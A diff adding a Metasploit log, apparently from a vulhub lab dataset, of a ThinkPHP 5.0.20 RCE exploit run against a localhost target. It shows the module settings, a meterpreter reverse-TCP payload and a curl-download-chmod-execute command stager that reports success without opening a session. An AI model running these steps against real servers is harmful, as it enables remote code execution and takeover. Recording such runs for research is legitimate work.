@@ -1,0 +1,42 @@
+[*] Spooling to file /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/thinkphp_5rce/scan3.stdout...
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> use exploit/unix/webapp/thinkphp_rce
+[*] Using configured payload linux/x64/meterpreter_reverse_tcp
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> set RPORT 18030
+RPORT => 18030
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> set LPORT 4453
+LPORT => 4453
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> set TARGETURI /
+TARGETURI => /
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> set SSL false
+SSL => false
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> set VERBOSE true
+VERBOSE => true
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> check
+[+] 127.0.0.1:18030 - The target appears to be vulnerable. ThinkPHP 5.0.20 is a vulnerable version.
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> sleep 20
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4453 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. ThinkPHP 5.0.20 is a vulnerable version.
+[*] Targeting ThinkPHP 5.0.20 automatically
+[*] Using URL: http://127.0.0.1:8080/Nmf0Zmi
+[*] Generated command stager: ["curl -so /tmp/qqZjWQYq http://127.0.0.1:8080/Nmf0Zmi;chmod +x /tmp/qqZjWQYq;/tmp/qqZjWQYq;rm -f /tmp/qqZjWQYq"]
+[*] Executing command: curl -so /tmp/qqZjWQYq http://127.0.0.1:8080/Nmf0Zmi;chmod +x /tmp/qqZjWQYq;/tmp/qqZjWQYq;rm -f /tmp/qqZjWQYq
+[+] Successfully executed command: curl -so /tmp/qqZjWQYq http://127.0.0.1:8080/Nmf0Zmi;chmod +x /tmp/qqZjWQYq;/tmp/qqZjWQYq;rm -f /tmp/qqZjWQYq
+[*] Command Stager progress - 100.00% done (109/109 bytes)
+[*] Server stopped.
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (raw/metasploit/thinkphp_5rce/run3.rc)> spool off
